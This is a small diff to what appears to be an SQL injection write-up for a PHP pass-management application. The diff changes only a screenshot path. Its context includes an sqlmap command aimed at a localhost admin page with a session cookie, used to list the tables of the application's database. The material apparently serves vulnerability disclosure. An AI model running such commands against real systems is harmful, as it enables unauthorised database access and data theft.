@@ -53,7 +53,7 @@
    python sqlmap.py -u "http://localhost/rpms/admin/view-pass-detail.php?viewid=1" --cookie="PHPSESSID=4acbjc61q1opnkih7qmkd6g9t7" -D rpmsdb --tables --batch
    ```
 
-   ![](../../img/20230427165849.png)
+   ![](../../img/20230427213213.png)
 
 **[code analysis]:**
 
